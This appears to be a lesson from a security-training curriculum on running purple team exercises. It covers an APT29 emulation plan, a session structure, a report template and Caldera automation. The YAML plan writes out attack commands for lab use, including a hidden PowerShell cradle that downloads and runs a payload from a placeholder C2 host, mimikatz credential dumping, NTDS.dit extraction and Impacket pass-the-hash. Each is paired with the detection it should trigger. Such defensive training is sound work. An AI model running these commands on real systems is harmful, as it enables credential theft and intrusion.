---
title: "Purple Team Leadership — Running an Exercise, ATT&CK Emulation Plans, Feedback Loop"
tags: [purple-team, att&ck-emulation, caldera, atomic-red-team, feedback-loop,
  module-12-postghost]
module: 12-PostGhostLevel
day: 738
prerequisites:
  - Day 509 — Atomic Red Team Lab
  - Day 737 — Advanced Detection Engineering
related_topics:
  - Day 749 — Specialization Research Plan
---

# Day 738 — Purple Team Leadership: Running Your Own Exercise

> "Red team and blue team in separate rooms is a game. Red team and blue team in
> the same room — with the same objectives — is a programme. The best
> organisations do not wait for a penetration test to improve their defences.
> They build the adversary simulation into their weekly workflow. That is purple
> teaming. That is what you should be running."
>
> — Ghost

---

## Goals

Understand the structure and purpose of a purple team exercise. Know the
difference between a purple team and a penetration test. Build a complete
ATT&CK emulation plan for a named threat actor. Run a purple team session and
produce a defensibility report.

**Prerequisites:** Days 509, 737.
**Estimated study time:** 3 hours.

---

## 1 — Purple Team vs Penetration Test

```
COMPARISON TABLE

                    PENETRATION TEST       PURPLE TEAM EXERCISE

Primary goal:       Find vulnerabilities   Validate and improve detections
Outcome:            Finding report         Detection improvement report
Red / Blue:         Separate (blind)       Collaborative (shared objectives)
Frequency:          Annual / quarterly     Weekly to monthly
Threat model:       Generic (OWASP Top 10) Specific actor (APT28, FIN7, etc.)
Blue team role:     Receive report         Active participant in real time
Session length:     Days to weeks          4–8 hour focused exercise
What changes after: Remediation plan       Detections deployed same day

WHEN TO USE EACH:
  Pentest: compliance, annual "how bad is it" health check
  Purple:  continuous improvement, TTP coverage validation, team training
```

---

## 2 — The ATT&CK Emulation Plan

MITRE publishes detailed emulation plans for real APT groups. These are
the foundation of a professional purple team exercise.

### 2.1 Available Emulation Plans

```
MITRE ATT&CK Evaluations emulation plans (public):
  APT3     Reconnaissance + initial access + exfiltration
  APT29    Cozy Bear — sophisticated espionage TTPs
  FIN6     Financial sector cybercriminal, POS malware
  Carbanak  Banking trojan, lateral movement, ATM cashout

Source: https://github.com/center-for-threat-informed-defense/adversary_emulation_plans

Example plan structure (APT29 excerpt):
  Phase 1: Initial Access via spearphishing (T1566.001)
  Phase 2: Execution via malicious macro (T1204.002)
  Phase 3: Persistence via Scheduled Task (T1053.005)
  Phase 4: Credential Access via LSASS dump (T1003.001)
  Phase 5: Lateral Movement via Pass-the-Hash (T1550.002)
  Phase 6: Collection + Exfiltration via C2 (T1041)
```

### 2.2 Custom Emulation Plan Template

```yaml
# emulation-plan-APT29-subset.yaml

name: "APT29 Subset Exercise — Credential Access Focus"
threat_actor: APT29 (Cozy Bear)
target_environment: sable-dc.corp.local (lab)
session_date: "[date]"
duration: "4 hours"
facilitator: "[your name]"
blue_team_lead: "[name]"

phases:
  - id: "P1"
    name: "Execution"
    techniques:
      - id: "T1059.001"
        name: "PowerShell"
        tool: "powershell.exe"
        command: >
          powershell.exe -NoP -NonI -W Hidden
          -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(
          'http://[c2]/payload.ps1')
        detection_expected: "ps-download-cradle Sigma rule"
        notes: "Validate Sigma rule fires within 30 seconds of execution"

  - id: "P2"
    name: "Credential Access"
    techniques:
      - id: "T1003.001"
        name: "LSASS Memory Dump"
        tool: "mimikatz.exe"
        command: "sekurlsa::logonpasswords"
        detection_expected: "Sysmon Event 10 — lsass access by unexpected process"
        notes: "Check EDR alert; also look for Sysmon Event ID 10"

      - id: "T1003.003"
        name: "NTDS.dit Extraction"
        tool: "ntdsutil.exe or VSS shadow copy"
        command: "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds\" q q"
        detection_expected: "ntdsutil command-line detection, Sigma: ntds-extraction"
        notes: "Blue team: look for Volume Shadow Copy creation event"

  - id: "P3"
    name: "Lateral Movement"
    techniques:
      - id: "T1550.002"
        name: "Pass the Hash (WMI)"
        tool: "Impacket wmiexec.py"
        command: "wmiexec.py corp.local/[user]@sable-ws1 -hashes :NTLM_HASH"
        detection_expected: "WMI remote execution Sigma rule"
        notes: "Check if Event ID 4624 logon type 3 fires with anomalous source"

success_criteria:
  detection_rate: ">= 3/4 techniques detected"
  alert_latency: "< 5 minutes per detection"
  blue_team_response: "SOC ticket opened within 10 minutes of first alert"
```

---

## 3 — Running the Exercise

### 3.1 Exercise Structure

```
PURPLE TEAM SESSION STRUCTURE (4-hour format)

PRE-EXERCISE (30 minutes)
  Brief both teams on:
  - Today's threat actor: APT29
  - Techniques in scope (from emulation plan)
  - Rules of engagement: lab environment only, no real production
  - Communication channel: shared Slack/Teams thread
  - Blue team pre-position: all Sigma rules deployed, SIEM alert dashboard open
  - No "gotchas" — the goal is to improve detection, not win

EXECUTION PHASE (2.5 hours)
  Red team executes each technique per the emulation plan.
  For each technique:
    Red team: executes the command, logs timestamp
    Blue team: monitors SIEM/EDR for alert
    Both: document result in shared worksheet

  Real-time worksheet columns:
    Technique | Timestamp | Alert Fired Y/N | Alert Latency | Rule Fired | FP Count

ANALYSIS PHASE (30 minutes)
  Review the worksheet together:
  - Missing detections: prioritise for same-day rule writing
  - High-latency detections: tune pipeline
  - FP spikes: add filter conditions to rules

REMEDIATION PHASE (30 minutes)
  Write or update rules for missed techniques
  Test new rules against replayed log events
  Deploy updated rules to SIEM
  Rerun one missed technique to confirm new rule fires

DEBRIEF (30 minutes)
  What did we learn?
  What changed today (new/improved rules)?
  What do we do differently next exercise?
```

### 3.2 The Purple Team Report

```
PURPLE TEAM EXERCISE REPORT

Header:
  Date:           [date]
  Duration:       [X hours]
  Threat Actor:   APT29 (Cozy Bear)
  Environment:    sable-dc.corp.local lab
  Participants:   Red: [names], Blue: [names]

Results Summary:
  Techniques tested:        8
  Techniques detected:      5/8 (63%)
  New rules written:        3
  Existing rules improved:  2
  Average alert latency:    2.4 minutes
  False positives added:    0 (all new rules filtered clean)

Technique Results:
  [table: same as worksheet above]

Rules Changed:
  Added: T1003.001 LSASS-access-unexpected-process.yml
  Added: T1003.003 ntds-extraction-via-ntdsutil.yml
  Improved: ps-download-cradle.yml (added Intune filter, reduced FP 40%)

Gap Analysis (missed detections):
  T1550.002 Pass-the-Hash via WMI
  Reason: Sysmon EventID 4624 rule missing, not deployed
  Action: Write rule, test next session

Recommendations:
  1. Deploy Sysmon configuration update to capture lateral movement events
  2. Schedule next session in 2 weeks: focus on lateral movement TTPs
  3. Track coverage metric: current 63% vs target 80%
```

---

## 4 — Running Exercises with Caldera

```python
# Caldera REST API — start an operation programmatically
import requests
import json

BASE = "http://localhost:8888"
HEADERS = {"KEY": "ADMIN123", "Content-Type": "application/json"}

# Create operation using APT29 adversary profile
operation = {
    "name": "Purple Exercise APT29",
    "adversary": {"adversary_id": "534e5c6a-2819-4a1d-b0d8-87bbc5b0ab77"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30d31a"},
    "group": "blue_team_group",
    "auto_close": False,
    "jitter": "2/8"
}

resp = requests.post(
    f"{BASE}/api/v2/operations",
    headers=HEADERS,
    json=operation
)
op_id = resp.json()["id"]
print(f"Operation started: {op_id}")
print(f"Monitor at: {BASE}/operations/{op_id}")
```

---

## Key Takeaways

1. **Purple teaming is the fastest way to improve detection coverage.** A
   4-hour purple session with 3 new rules deployed beats a quarterly pentest
   report that takes 3 months to remediate.
2. **The emulation plan is non-negotiable.** Without a structured plan based
   on a real adversary's TTPs, the exercise drifts into "run random stuff and
   see what alerts." That is not intelligence-driven defence.
3. **The debrief is where the learning happens.** Red team wins are ephemeral
   unless they produce durable detection improvements in the same session.
4. **Measure coverage, not sessions.** The goal is not "we ran 12 purple team
   exercises." The goal is "we went from 40% to 75% ATT&CK coverage for
   APT29 TTPs."

---

## Questions

> Add your questions here. Each question gets a Global ID (Q738.1, Q738.2 …).

---

## Navigation

← Previous: [Day 737 — Advanced Detection Engineering](DAY-0737-Advanced-Detection-Engineering.md)
→ Next: [Day 739 — Continuous Fuzzing: OSS-Fuzz](DAY-0739-Continuous-Fuzzing-OSS-Fuzz.md)
